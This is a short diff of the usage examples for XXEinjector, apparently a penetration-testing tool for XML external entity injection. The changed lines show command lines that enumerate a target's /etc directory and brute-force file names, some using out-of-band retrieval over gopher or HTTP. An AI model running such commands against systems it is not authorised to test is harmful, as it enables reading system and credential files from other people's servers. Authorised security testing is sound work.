@@ -22,9 +22,9 @@ Options:<br />
   --verbose	Show verbose messages.<br />
 
 Example usage:<br />
-  Enumerating /etc directory using HTTPS protocol with proxy:<br />
+  Enumerating /etc directory in HTTPS application:<br />
   ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl --proxy=127.0.0.1:8080<br />
-  Enumerating /etc directory using HTTP protocol:<br />
-  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt<br />
-  Bruteforcing files:<br />
-  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt
+  Enumerating /etc directory using gopher for OOB method:<br />
+  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher<br />
+  Bruteforcing files using HTTP out of band method:<br />
+  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http
